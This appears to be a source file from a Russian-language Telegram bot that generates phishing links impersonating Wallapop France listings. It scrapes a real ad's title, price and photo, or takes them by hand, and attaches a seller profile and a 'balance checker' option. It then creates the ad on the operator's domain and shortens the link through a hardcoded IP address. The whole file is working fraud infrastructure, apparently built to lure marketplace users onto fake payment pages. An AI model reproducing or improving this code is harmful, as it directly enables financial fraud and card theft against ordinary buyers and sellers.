const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles,MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");

const downloadImage = require("../../helpers/downloadImage");

const myAd = require("../../commands/myAd");

const wallapop_fr_domains = ["fr.wallapop.com","wallapop.com","www.wallapop.com"];
const scene = new WizardScene(
  "create_link_wallapop_fr",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "wallapop_fr",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.wizard.state.code = ctx.match[1];
      log(ctx, "перешёл к созданию ссылки WALLAPOP.FR");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Выбери способ генерации ссылки:", {
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton("Ручной", "default"),
            Markup.callbackButton("Парсер", "parser"),
          ],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
            // Проверяем, что пользователь нажал на кнопку, а не написал текст
      if (!ctx.callbackQuery) {
        await ctx.scene
          .reply("❌ Пожалуйста, выбери способ генерации ссылки:", {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("Ручной", "default"),
                Markup.callbackButton("Парсер", "parser"),
              ],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch(() => {});
        return; // остаёмся на этом шаге
      }
      ctx.wizard.state.typeCreate = ctx.callbackQuery.data;

      if (ctx.callbackQuery.data == "parser") {
        await ctx.scene.reply("Отправьте ссылку на объявление WALLAPOP.FR", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        await ctx.scene
          .reply("Введите название объявления", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
      }
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        if (!ctx.message?.text) return ctx.wizard.prevStep();
        var url;
        try {
          url = new URL(ctx.message.text);
        } catch (err) {
          await ctx
            .replyOrEdit("❌ Введите валидную ссылку")
            .catch((err) => err);
          return ctx.wizard.prevStep();
        }
        if (!wallapop_fr_domains.includes(url.host)) {
          await ctx
            .replyOrEdit("❌ Введите ссылку на объявление WALLAPOP.FR")
            .catch((err) => err);
          return ctx.wizard.prevStep();
        }

        log(ctx, `отправил ссылку для парсинга WALLAPOP.FR (${url.href})`);

        await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
       const ad = await axios.get(encodeURI(url.href)),
          $ = cheerio.load(ad.data);
        const imgElement = $("meta[name='og:image']").first();
        const photoURL = imgElement.attr("content");

        const priceSelectors = [
          ".item-detail-purchase-footer_ItemDetailPurchase__itemInfo--chunky__snLt5",
          ".item-detail-price_ItemDetailPrice--standard__TxPXr"
        ];

        const price = priceSelectors
          .map(sel => $(sel).first().text().trim())
          .find(text => text); // Первый непустой

        // ⬇️ Парсим title либо с основного блока, либо из meta
        let title = $(".d-md-none.item-detail_ItemDetailTwoColumns__mobileTitle__sKSaU.mt-2").text().trim();

        if (!title) {
          title = $('meta[name="og:title"]').attr("content")?.trim() || "";
        }

        const info = {
          title,
          price,
          adLink: url.href,
          photo: photoURL
        };
          
        if (!info.title || !info.price) {
          await ctx.scene
            .reply("❌ Не удалось спарсить объявление")
            .catch((err) => err);
          return ctx.scene.leave();
        }
        log(ctx, `спарсил объявление WALLAPOP.FR (${url.href})`);
        ctx.scene.state.data = info;

        const profiles = await Profiles.findAll({
          where: { userId: ctx.from.id },
        });

        var buttons = profiles.map((v) => [
          Markup.callbackButton(v.title, v.id),
        ]);

        await ctx.scene.reply(`Выберите профиль`, {
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      } else {
        ctx.scene.state.data.title = escapeHTML(ctx.message.text);

        const service = await Service.findOne({
          where: {
            code: ctx.wizard.state.code,
          },
        });
        await ctx.scene
          .reply(
            `Введите цену объявления (только число, в ${service.currencyCode})`,
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("Отменить", "cancel")],
              ]),
            }
          )
          .catch((err) => err);
      }
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        const profiles = await Profiles.findOne({
          where: { id: ctx.callbackQuery.data },
        });

        ctx.scene.state.data.address = profiles.address;
        ctx.scene.state.data.name = profiles.name;
        ctx.scene.state.data.phone = profiles.phone;

        await ctx.scene
          .reply("Чекер баланса", {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("Включить", "true"),
                Markup.callbackButton("Выключить", "false"),
              ],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
      } else {
        var amount = parseFloat(ctx.message?.text);
        if (isNaN(amount)) return ctx.wizard.prevStep();
        if (amount % 1 == 0) amount = amount.toFixed(0);
        else amount = amount.toFixed(2);

        amount = amount + " €";

        ctx.scene.state.data.price = amount;

        const profiles = await Profiles.findAll({
          where: { userId: ctx.from.id },
        });

        var buttons = profiles.map((v) => [
          Markup.callbackButton(v.title, v.id),
        ]);

        await ctx.scene.reply(`Выберите профиль`, {
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
      }
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.wizard.state.typeCreate == "parser") {
        if (!["true", "false"].includes(ctx.callbackQuery?.data))
          return ctx.wizard.prevStep();
        ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";

        const service = await Service.findOne({
          where: {
            code: "wallapop_fr",
          },
        });
        if (!service) {
          await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
          return ctx.scene.leave();
        }
      const generateSpecialId = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 13; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const ad = await Ad.create({
  id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
  userId: ctx.from.id,
  ...ctx.scene.state.data,
  serviceCode: "wallapop_fr",
});

const domains = await MyDomains.findOne({ 
  where: { userId: ctx.from.id }, 
  }); 
  
  let reductionUrl; 
  
  try { 
  const reduction = await axios.post( 
  "http://185.208.158.144/api/create", 
  { 
  target: `https://${service.domain}/${ad.id}`, 
  domain: service.shortlink || ctx.state.bot.shortlink, 
  }, 
  { timeout: 2000 } 
  ); 
  
  reductionUrl = reduction.data.url; 
  } catch (error) { 
  console.error("Ошибка при создании сокращенной ссылки:", error.message); 
  
  if (error.code === 'ECONNABORTED') { 
  console.warn("Запрос превысил допустимый тайм-аут."); 
  } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
  console.warn("Сервер сокращений недоступен."); 
  } else { 
  console.warn("Произошла непредвиденная ошибка:", error.message); 
  } 
  
  reductionUrl = null; // корректный fallback 
  } 
  
  const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
  
  await ad.update({ 
  myDomainLink: personalDomainLink, 
  shortLink: reductionUrl, // используем переменную 
  }); 
  
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
        
        ctx.updateType = "message";

        return ctx.scene.leave();
      } else {
        const profiles = await Profiles.findOne({
          where: { id: ctx.callbackQuery.data },
        });

        ctx.scene.state.data.address = profiles.address;
        ctx.scene.state.data.name = profiles.name;
        ctx.scene.state.data.phone = profiles.phone;

        await ctx.scene
          .reply("Отправьте изображение в сжатом формате", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Пропустить", "skip")],
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);
        return ctx.wizard.next();
      }
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.reply("Ошибка");
      if (!ctx.callbackQuery) {
        const photo_link = await ctx.telegram.getFileLink(
          ctx.message.photo[1].file_id
        );
        ctx.wizard.state.data.photo = await downloadImage(photo_link);
      } else {
        ctx.wizard.state.data.photo = null;
      }

      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";

      const service = await Service.findOne({
        where: {
          code: ctx.wizard.state.code,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

        const generateSpecialId = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 13; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const ad = await Ad.create({
  id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
  userId: ctx.from.id,
  ...ctx.scene.state.data,
  serviceCode: "wallapop_fr",
});

const domains = await MyDomains.findOne({ 
  where: { userId: ctx.from.id }, 
  }); 
  
  let reductionUrl; 
  
  try { 
  const reduction = await axios.post( 
  "http://185.208.158.144/api/create", 
  { 
  target: `https://${service.domain}/${ad.id}`, 
  domain: service.shortlink || ctx.state.bot.shortlink, 
  }, 
  { timeout: 2000 } 
  ); 
  
  reductionUrl = reduction.data.url; 
  } catch (error) { 
  console.error("Ошибка при создании сокращенной ссылки:", error.message); 
  
  if (error.code === 'ECONNABORTED') { 
  console.warn("Запрос превысил допустимый тайм-аут."); 
  } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
  console.warn("Сервер сокращений недоступен."); 
  } else { 
  console.warn("Произошла непредвиденная ошибка:", error.message); 
  } 
  
  reductionUrl = null; // корректный fallback 
  } 
  
  const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
  
  await ad.update({ 
  myDomainLink: personalDomainLink, 
  shortLink: reductionUrl, // используем переменную 
  }); 
  
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      
      ctx.updateType = "message";
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);


module.exports = scene;
